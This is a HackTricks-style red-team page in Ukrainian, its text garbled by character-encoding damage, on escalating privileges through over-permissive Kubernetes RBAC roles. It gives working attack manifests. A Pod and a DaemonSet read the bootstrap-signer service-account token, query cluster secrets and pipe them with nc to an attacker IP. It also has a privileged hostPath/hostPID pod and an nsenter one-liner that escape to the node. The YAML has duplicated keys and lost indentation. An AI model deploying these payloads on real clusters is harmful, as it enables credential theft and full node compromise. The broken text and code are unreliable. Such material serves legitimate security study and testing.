# –ó–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è —Ä–æ–ª—è–º–∏/–∫–ª–∞—Å—Ç–µ—Ä–Ω–∏–º–∏ —Ä–æ–ª—è–º–∏ –≤ Kubernetes

{% hint style="success" %}
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –≤–ø—Ä–∞–≤–ª—è–π—Ç–µ—Å—è –≤ —Ö–∞–∫—ñ–Ω–≥—É AWS: <img src="/.gitbook/assets/image.png" alt="" data-size="line">[**–®–∫–æ–ª–∞ —Ö–∞–∫—ñ–Ω–≥—É HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –≤–ø—Ä–∞–≤–ª—è–π—Ç–µ—Å—è –≤ —Ö–∞–∫—ñ–Ω–≥—É GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**–®–∫–æ–ª–∞ —Ö–∞–∫—ñ–Ω–≥—É HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞–π—Ç–µ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–ü–æ—à–∏—Ä—é–π—Ç–µ —Ö–∞–∫–µ—Ä—Å—å–∫—ñ —Ç—Ä—é–∫–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ GitHub.

</details>
{% endhint %}

–¢—É—Ç –≤–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ –¥–µ—è–∫—ñ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ –Ω–µ–±–µ–∑–ø–µ—á–Ω—ñ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó –†–æ–ª–µ–π —Ç–∞ –ö–ª–∞—Å—Ç–µ—Ä–Ω–∏—Ö –†–æ–ª–µ–π.\
–ü–∞–º'—è—Ç–∞–π—Ç–µ, —â–æ –≤–∏ –º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –≤—Å—ñ –ø—ñ–¥—Ç—Ä–∏–º—É–≤–∞–Ω—ñ —Ä–µ—Å—É—Ä—Å–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é `kubectl api-resources`

## **–ü—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤**

–ù–∞–∑–∏–≤–∞—é—á–∏ —Ü–µ –º–∏—Å—Ç–µ—Ü—Ç–≤–æ–º –æ—Ç—Ä–∏–º–∞–Ω–Ω—è **–¥–æ—Å—Ç—É–ø—É –¥–æ —ñ–Ω—à–æ–≥–æ –ø—Ä–∏–Ω—Ü–∏–ø–∞–ª–∞** –≤ –º–µ–∂–∞—Ö –∫–ª–∞—Å—Ç–µ—Ä–∞ **–∑ —ñ–Ω—à–∏–º–∏ –ø—Ä–∏–≤—ñ–ª–µ—è–º–∏** (–≤ –º–µ–∂–∞—Ö –∫–ª–∞—Å—Ç–µ—Ä–∞ Kubernetes –∞–±–æ –¥–æ –∑–æ–≤–Ω—ñ—à–Ω—ñ—Ö —Ö–º–∞—Ä), –≤ Kubernetes —ñ—Å–Ω—É—î –≤ –æ—Å–Ω–æ–≤–Ω–æ–º—É **4 –æ—Å–Ω–æ–≤–Ω—ñ —Ç–µ—Ö–Ω—ñ–∫–∏ –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤**:

* –ú–∞—Ç–∏ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å **—ñ–º–ø–µ—Ä—Å–æ–Ω—É–≤–∞—Ç–∏** —ñ–Ω—à–∏—Ö –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤/–≥—Ä—É–ø–∏/–°–ê –∑ –∫—Ä–∞—â–∏–º–∏ –ø—Ä–∏–≤—ñ–ª–µ—è–º–∏ –≤ –º–µ–∂–∞—Ö –∫–ª–∞—Å—Ç–µ—Ä–∞ Kubernetes –∞–±–æ –¥–æ –∑–æ–≤–Ω—ñ—à–Ω—ñ—Ö —Ö–º–∞—Ä
* –ú–∞—Ç–∏ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å **—Å—Ç–≤–æ—Ä—é–≤–∞—Ç–∏/–∑–º—ñ–Ω—é–≤–∞—Ç–∏/–≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∏** –¥–µ –≤–∏ –º–æ–∂–µ—Ç–µ **–∑–Ω–∞–π—Ç–∏ –∞–±–æ –ø—Ä–∏—î–¥–Ω–∞—Ç–∏ –°–ê** –∑ –∫—Ä–∞—â–∏–º–∏ –ø—Ä–∏–≤—ñ–ª–µ—è–º–∏ –≤ –º–µ–∂–∞—Ö –∫–ª–∞—Å—Ç–µ—Ä–∞ Kubernetes –∞–±–æ –¥–æ –∑–æ–≤–Ω—ñ—à–Ω—ñ—Ö —Ö–º–∞—Ä
* –ú–∞—Ç–∏ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å **—á–∏—Ç–∞—Ç–∏ —Å–µ–∫—Ä–µ—Ç–∏**, –æ—Å–∫—ñ–ª—å–∫–∏ —Ç–æ–∫–µ–Ω–∏ –°–ê –∑–±–µ—Ä—ñ–≥–∞—é—Ç—å—Å—è —è–∫ —Å–µ–∫—Ä–µ—Ç–∏
* –ú–∞—Ç–∏ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å **–≤–∏–±—Ä–∞—Ç–∏—Å—è –Ω–∞ –≤—É–∑–æ–ª** –∑ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞, –¥–µ –≤–∏ –º–æ–∂–µ—Ç–µ –≤–∫—Ä–∞—Å—Ç–∏ –≤—Å—ñ —Å–µ–∫—Ä–µ—Ç–∏ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä—ñ–≤, —â–æ –ø—Ä–∞—Ü—é—é—Ç—å –Ω–∞ –≤—É–∑–ª—ñ, –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ –≤—É–∑–ª–∞ —Ç–∞ –¥–æ–∑–≤–æ–ª–∏ –≤—É–∑–ª–∞ –≤ –º–µ–∂–∞—Ö —Ö–º–∞—Ä–∏, –≤ —è–∫—ñ–π –≤—ñ–Ω –ø—Ä–∞—Ü—é—î (—è–∫—â–æ —Ç–∞–∫—ñ —î)
* –ü'—è—Ç–∞ —Ç–µ—Ö–Ω—ñ–∫–∞, —è–∫–∞ –∑–∞—Å–ª—É–≥–æ–≤—É—î –Ω–∞ –∑–≥–∞–¥–∫—É, - —Ü–µ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å **–∑–∞–ø—É—Å—Ç–∏—Ç–∏ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–Ω—è –ø–æ—Ä—Ç—ñ–≤** –≤ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä—ñ, –æ—Å–∫—ñ–ª—å–∫–∏ –≤–∏ –º–æ–∂–µ—Ç–µ –º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ —Ü—ñ–∫–∞–≤–∏—Ö —Ä–µ—Å—É—Ä—Å—ñ–≤ –≤ —Ü—å–æ–º—É –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä—ñ.

### –î–æ—Å—Ç—É–ø –¥–æ –±—É–¥—å-—è–∫–æ–≥–æ —Ä–µ—Å—É—Ä—Å—É –∞–±–æ –¥—ñ—ó (–ó—ñ—Ä–æ—á–∫–∞)

**–ó—ñ—Ä–æ—á–∫–∞ (\*) –Ω–∞–¥–∞—î –¥–æ–∑–≤—ñ–ª –Ω–∞ –±—É–¥—å-—è–∫–∏–π —Ä–µ—Å—É—Ä—Å –∑ –±—É–¥—å-—è–∫–æ—é –¥—ñ—î—é**. –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞–º–∏. –£ –º–µ–∂–∞—Ö –ö–ª–∞—Å—Ç–µ—Ä–Ω–æ—ó –†–æ–ª—ñ —Ü–µ –æ–∑–Ω–∞—á–∞—î, —â–æ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ –±—É–¥—å-—è–∫–∏–º –ø—Ä–æ—Å—Ç–æ—Ä–æ–º —ñ–º–µ–Ω –≤ –∫–ª–∞—Å—Ç–µ—Ä—ñ.
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["*"]
```
### –û—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ—Å—Ç—É–ø—É –¥–æ –±—É–¥—å-—è–∫–æ–≥–æ —Ä–µ—Å—É—Ä—Å—É –∑ –∫–æ–Ω–∫—Ä–µ—Ç–Ω–∏–º –¥—ñ—î—Å–ª–æ–≤–æ–º

–£ RBAC –¥–µ—è–∫—ñ –¥–æ–∑–≤–æ–ª–∏ —Å—Ç–∞–Ω–æ–≤–ª—è—Ç—å –∑–Ω–∞—á–Ω–∏–π —Ä–∏–∑–∏–∫:

1. **`create`:** –ù–∞–¥–∞—î –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å —Å—Ç–≤–æ—Ä—é–≤–∞—Ç–∏ –±—É–¥—å-—è–∫–∏–π –∫–ª–∞—Å—Ç–µ—Ä–Ω–∏–π —Ä–µ—Å—É—Ä—Å, –∑–∞–≥—Ä–æ–∂—É—é—á–∏ –µ—Å–∫–∞–ª–∞—Ü—ñ—î—é –ø—Ä–∏–≤—ñ–ª–µ—ó–≤.
2. **`list`:** –î–æ–∑–≤–æ–ª—è—î –ø–µ—Ä–µ–ª—ñ–∫ —É—Å—ñ—Ö —Ä–µ—Å—É—Ä—Å—ñ–≤, —â–æ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ –º–æ–∂–µ –≤–∏—Ç—ñ–∫–∞—Ç–∏ –∫–æ–Ω—Ñ—ñ–¥–µ–Ω—Ü—ñ–π–Ω—ñ –¥–∞–Ω—ñ.
3. **`get`:** –î–æ–∑–≤–æ–ª—è—î –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ—Å—Ç—É–ø—É –¥–æ —Å–µ–∫—Ä–µ—Ç—ñ–≤ –≤—ñ–¥ –æ–±–ª—ñ–∫–æ–≤–∏—Ö –∑–∞–ø–∏—Å—ñ–≤ —Å–ª—É–∂–±, —â–æ —Å—Ç–∞–Ω–æ–≤–∏—Ç—å –∑–∞–≥—Ä–æ–∑—É –±–µ–∑–ø–µ—Ü—ñ.
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["create", "list", "get"]
```
### –°—Ç–≤–æ—Ä–µ–Ω–Ω—è Pod - –ö—Ä–∞–¥—ñ–∂–∫–∞ —Ç–æ–∫–µ–Ω—É

–ó–ª–æ–≤–º–∏—Å–Ω–∏–∫ –∑ –¥–æ–∑–≤–æ–ª–æ–º –Ω–∞ —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è pod –º–æ–∂–µ –¥–æ–¥–∞—Ç–∏ –ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–∏–π –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å —Å–ª—É–∂–±–∏ –≤ pod —ñ –≤–∫—Ä–∞—Å—Ç–∏ —Ç–æ–∫–µ–Ω –¥–ª—è —ñ–º—ñ—Ç–∞—Ü—ñ—ó –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É —Å–ª—É–∂–±–∏. –ï—Ñ–µ–∫—Ç–∏–≤–Ω–æ –ø—ñ–¥–≤–∏—â—É—é—á–∏ –ø—Ä–∏–≤—ñ–ª–µ—ó –¥–æ –Ω—å–æ–≥–æ

–ü—Ä–∏–∫–ª–∞–¥ pod, —è–∫–∏–π –≤–∫—Ä–∞–¥–µ —Ç–æ–∫–µ–Ω –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É —Å–ª—É–∂–±–∏ `bootstrap-signer` —ñ –Ω–∞–¥—ñ—à–ª–µ –π–æ–≥–æ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫—É:
```yaml
apiVersion: v1
kind: Pod
metadata:
name: alpine
namespace: kube-system
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
```
### –°—Ç–≤–æ—Ä–µ–Ω–Ω—è —Ç–∞ –≤—Ç–µ—á–∞ –∑ Pod

–ù–∞—Å—Ç—É–ø–Ω–µ –≤–∫–∞–∑—É—î –Ω–∞ –≤—Å—ñ –ø—Ä–∏–≤—ñ–ª–µ—ó, —è–∫—ñ –º–æ–∂–µ –º–∞—Ç–∏ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä:

* **–ü—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–∏–π –¥–æ—Å—Ç—É–ø** (–≤–∏–º–∫–Ω–µ–Ω–Ω—è –∑–∞—Ö–∏—Å—Ç—É —Ç–∞ –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è –º–æ–∂–ª–∏–≤–æ—Å—Ç–µ–π)
* **–í–∏–º–∫–Ω–µ–Ω–Ω—è –ø—Ä–æ—Å—Ç–æ—Ä—ñ–≤ —ñ–º–µ–Ω hostIPC —Ç–∞ hostPid**, —â–æ –º–æ–∂–µ –¥–æ–ø–æ–º–æ–≥—Ç–∏ —É –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—ñ –ø—Ä–∏–≤—ñ–ª–µ—ó–≤
* **–í–∏–º–∫–Ω–µ–Ω–Ω—è –ø—Ä–æ—Å—Ç–æ—Ä—É —ñ–º–µ–Ω hostNetwork**, —â–æ –¥–∞—î –¥–æ—Å—Ç—É–ø –¥–æ –≤–∏–∫—Ä–∞–¥–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ —Ö–º–∞—Ä–Ω–∏—Ö –≤—É–∑–ª—ñ–≤ —Ç–∞ –∫—Ä–∞—â–∏–π –¥–æ—Å—Ç—É–ø –¥–æ –º–µ—Ä–µ–∂
* **–ü—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è /etc/ —Ö–æ—Å—Ç—ñ–≤ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞**

{% code title="super_privs.yaml" %}
```yaml
apiVersion: v1
kind: Pod
metadata:
name: ubuntu
labels:
app: ubuntu
spec:
# Uncomment and specify a specific node you want to debug
# nodeName: <insert-node-name-here>
containers:
- image: ubuntu
command:
- "sleep"
- "3600" # adjust this as needed -- use only as long as you need
imagePullPolicy: IfNotPresent
name: ubuntu
securityContext:
allowPrivilegeEscalation: true
privileged: true
#capabilities:
#  add: ["NET_ADMIN", "SYS_ADMIN"] # add the capabilities you need https://man7.org/linux/man-pages/man7/capabilities.7.html
runAsUser: 0 # run as root (or any other user)
volumeMounts:
- mountPath: /host
name: host-volume
restartPolicy: Never # we want to be intentional about running this pod
hostIPC: true # Use the host's ipc namespace https://www.man7.org/linux/man-pages/man7/ipc_namespaces.7.html
hostNetwork: true # Use the host's network namespace https://www.man7.org/linux/man-pages/man7/network_namespaces.7.html
hostPID: true # Use the host's pid namespace https://man7.org/linux/man-pages/man7/pid_namespaces.7.htmlpe_
volumes:
- name: host-volume
hostPath:
path: /
```
{% endcode %}

–°—Ç–≤–æ—Ä—ñ—Ç—å pod –∑:
```bash
kubectl --token $token create -f mount_root.yaml
```
–û–¥–Ω–æ—Ä—è–¥–∫–æ–≤–∏–π –∫–æ–º–µ–Ω—Ç–∞—Ä –∑ [—Ü—å–æ–≥–æ —Ç–≤—ñ—Ç—É](https://twitter.com/mauilion/status/1129468485480751104) –∑ –¥–µ—è–∫–∏–º–∏ –¥–æ–¥–∞—Ç–∫–∞–º–∏:
```bash
kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}'
```
–¢–µ–ø–µ—Ä, –∫–æ–ª–∏ –≤–∏ –º–æ–∂–µ—Ç–µ –≤—Ç–µ–∫—Ç–∏ –¥–æ –≤—É–∑–ª–∞, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ —Ç–µ—Ö–Ω—ñ–∫–∏ –ø–æ—Å—Ç-–µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó –≤:

#### –ü—Ä–∏—Ö–æ–≤–∞–Ω—ñ—Å—Ç—å

–ô–º–æ–≤—ñ—Ä–Ω–æ, –≤–∞–º –∑–∞—Ö–æ—á–µ—Ç—å—Å—è –±—É—Ç–∏ **–ø—Ä–∏—Ö–æ–≤–∞–Ω—ñ—à–∏–º**, –Ω–∞ –Ω–∞—Å—Ç—É–ø–Ω–∏—Ö —Å—Ç–æ—Ä—ñ–Ω–∫–∞—Ö –≤–∏ –º–æ–∂–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏, –¥–æ —á–æ–≥–æ –≤–∏ –∑–º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø, —è–∫—â–æ —Å—Ç–≤–æ—Ä–∏—Ç–µ –∫–∞–ø—Å—É–ª—É, —É–≤—ñ–º–∫–Ω—É–≤—à–∏ –ª–∏—à–µ –¥–µ—è–∫—ñ –∑ –≤–∫–∞–∑–∞–Ω–∏—Ö –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ —É –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ–º—É —à–∞–±–ª–æ–Ω—ñ:

* **–ü—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–∏–π + hostPID**
* **–õ–∏—à–µ –ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–∏–π**
* **hostPath**
* **hostPID**
* **hostNetwork**
* **hostIPC**

_–í–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ –ø—Ä–∏–∫–ª–∞–¥ —Ç–æ–≥–æ, —è–∫ —Å—Ç–≤–æ—Ä–∏—Ç–∏/–∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ –ø–æ–ø–µ—Ä–µ–¥–Ω—ñ–º–∏ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—è–º–∏ –ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–∏—Ö –∫–∞–ø—Å—É–ª —É_ [_https://github.com/BishopFox/badPods_](https://github.com/BishopFox/badPods)

### –°—Ç–≤–æ—Ä–µ–Ω–Ω—è –∫–∞–ø—Å—É–ª–∏ - –ü–µ—Ä–µ—Ö—ñ–¥ –¥–æ —Ö–º–∞—Ä–∏

–Ø–∫—â–æ –≤–∏ –º–æ–∂–µ—Ç–µ **—Å—Ç–≤–æ—Ä–∏—Ç–∏** –∫–∞–ø—Å—É–ª—É (—ñ, –∑–∞ –±–∞–∂–∞–Ω–Ω—è–º, **–æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å —Å–ª—É–∂–±–∏**), –≤–∏, –º–æ–∂–ª–∏–≤–æ, –∑–º–æ–∂–µ—Ç–µ **–æ—Ç—Ä–∏–º–∞—Ç–∏ –ø—Ä–∏–≤—ñ–ª–µ—ó –≤ —Ö–º–∞—Ä–Ω–æ–º—É —Å–µ—Ä–µ–¥–æ–≤–∏—â—ñ**, **–ø—Ä–∏–∑–Ω–∞—á–∏–≤—à–∏ —Ö–º–∞—Ä–Ω—ñ —Ä–æ–ª—ñ –∫–∞–ø—Å—É–ª—ñ –∞–±–æ –æ–±–ª—ñ–∫–æ–≤–æ–º—É –∑–∞–ø–∏—Å—É —Å–ª—É–∂–±–∏**, –∞ –ø–æ—Ç—ñ–º –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ –Ω–∏—Ö –¥–æ—Å—Ç—É–ø.\
–ë—ñ–ª—å—à–µ —Ç–µ—Ö–Ω—ñ—á–Ω–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –¥–∏–≤—ñ—Ç—å—Å—è:

{% content-ref url="pod-escape-privileges.md" %}
[pod-escape-privileges.md](pod-escape-privileges.md)
{% endcontent-ref %}

### **–°—Ç–≤–æ—Ä–µ–Ω–Ω—è/–ó–º—ñ–Ω–∞ —Ä–æ–∑–≥–æ—Ä—Ç–∞–Ω–Ω—è, –î–µ–º–æ–Ω—ñ—á–Ω—ñ –Ω–∞–±–æ—Ä–∏, –ù–∞–±–æ—Ä–∏ –∑—ñ —Å—Ç–∞–Ω–æ–º, –ö–æ–Ω—Ç—Ä–æ–ª–µ—Ä–∏ —Ä–µ–ø–ª—ñ–∫–∞—Ü—ñ—ó, –ù–∞–±–æ—Ä–∏ —Ä–µ–ø–ª—ñ–∫, –ó–∞–≤–¥–∞–Ω–Ω—è —Ç–∞ –†–µ–≥—É–ª—è—Ä–Ω—ñ –∑–∞–≤–¥–∞–Ω–Ω—è**

–ú–æ–∂–ª–∏–≤–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ü—ñ –¥–æ–∑–≤–æ–ª–∏ –¥–ª—è **—Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –Ω–æ–≤–æ—ó –∫–∞–ø—Å—É–ª–∏** —Ç–∞ –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤, —è–∫ —É –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ–º—É –ø—Ä–∏–∫–ª–∞–¥—ñ.

–ù–∞—Å—Ç—É–ø–Ω–∏–π yaml **—Å—Ç–≤–æ—Ä—é—î –¥–µ–º–æ–Ω—ñ—á–Ω–∏–π –Ω–∞–±—ñ—Ä —Ç–∞ –≤–∏–≤–æ–¥–∏—Ç—å —Ç–æ–∫–µ–Ω –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É —Å–ª—É–∂–±–∏ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –∫–∞–ø—Å—É–ª–∏:**
```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
name: alpine
namespace: kube-system
spec:
selector:
matchLabels:
name: alpine
template:
metadata:
labels:
name: alpine
spec:
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
volumeMounts:
- mountPath: /root
name: mount-node-root
volumes:
- name: mount-node-root
hostPath:
path: /
```
### **–í–∏–∫–æ–Ω–∞–Ω–Ω—è Pods**

**`pods/exec`** - —Ü–µ —Ä–µ—Å—É—Ä—Å –≤ Kubernetes, —è–∫–∏–π –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è **–≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–º–∞–Ω–¥ –≤ –æ–±–æ–ª–æ–Ω—Ü—ñ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –ø–æ–¥–∞**. –¶–µ –¥–æ–∑–≤–æ–ª—è—î **–≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ –∫–æ–º–∞–Ω–¥–∏ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä—ñ–≤ –∞–±–æ –æ—Ç—Ä–∏–º—É–≤–∞—Ç–∏ –æ–±–æ–ª–æ–Ω–∫—É –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ**.

–û—Ç–∂–µ, –º–æ–∂–ª–∏–≤–æ **–ø–æ—Ç—Ä–∞–ø–∏—Ç–∏ –≤—Å–µ—Ä–µ–¥–∏–Ω—É –ø–æ–¥–∞ —Ç–∞ –≤–∫—Ä–∞—Å—Ç–∏ —Ç–æ–∫–µ–Ω SA**, –∞–±–æ –ø–æ—Ç—Ä–∞–ø–∏—Ç–∏ –≤ –ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–∏–π –ø–æ–¥, –≤—Ç–µ–∫—Ç–∏ –Ω–∞ –≤—É–∑–æ–ª —Ç–∞ –≤–∫—Ä–∞—Å—Ç–∏ –≤—Å—ñ —Ç–æ–∫–µ–Ω–∏ –ø–æ–¥—ñ–≤ –Ω–∞ –≤—É–∑–ª—ñ —Ç–∞ (–∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏) –≤—É–∑–æ–ª:
```bash
kubectl exec -it <POD_NAME> -n <NAMESPACE> -- sh
```
### port-forward

–¶—è –¥–æ–∑–≤—ñ–ª –¥–æ–∑–≤–æ–ª—è—î **–ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–∏—Ç–∏ –æ–¥–∏–Ω –ª–æ–∫–∞–ª—å–Ω–∏–π –ø–æ—Ä—Ç –Ω–∞ –æ–¥–∏–Ω –ø–æ—Ä—Ç —É –≤–∫–∞–∑–∞–Ω–æ–º—É –∫–æ—Ç–µ–π–Ω–µ—Ä—ñ**. –¶–µ –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–æ –¥–ª—è –º–æ–∂–ª–∏–≤–æ—Å—Ç—ñ –ª–µ–≥–∫–æ –≤—ñ–¥–ª–∞–≥–æ–¥–∂—É–≤–∞—Ç–∏ –¥–æ–¥–∞—Ç–∫–∏, —â–æ –ø—Ä–∞—Ü—é—é—Ç—å –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –∫–æ—Ç–µ–π–Ω–µ—Ä–∞, –∞–ª–µ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ —Ü–∏–º, —â–æ–± –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ —Ü—ñ–∫–∞–≤–∏—Ö (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –ë–î) –∞–±–æ –≤—Ä–∞–∑–ª–∏–≤–∏—Ö –¥–æ–¥–∞—Ç–∫—ñ–≤ (–≤–µ–±?) –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –∫–æ—Ç–µ–π–Ω–µ—Ä–∞:
```
kubectl port-forward pod/mypod 5000:5000
```
### –ó–∞–ø–∏—Å –Ω–∞ —Ö–æ—Å—Ç–∞—Ö /var/log/ Escape

–Ø–∫ [**–≤–∫–∞–∑–∞–Ω–æ –≤ —Ü—å–æ–º—É –¥–æ—Å–ª—ñ–¥–∂–µ–Ω–Ω—ñ**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html), —è–∫—â–æ –≤–∏ –º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –∞–±–æ —Å—Ç–≤–æ—Ä–∏—Ç–∏ pod –∑ **–º–æ–Ω—Ç—É–≤–∞–Ω–Ω—è–º –∫–∞—Ç–∞–ª–æ–≥—É —Ö–æ—Å—Ç—ñ–≤ `/var/log/`**, –≤–∏ –º–æ–∂–µ—Ç–µ **–≤–∏–π—Ç–∏ –∑ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞**.\
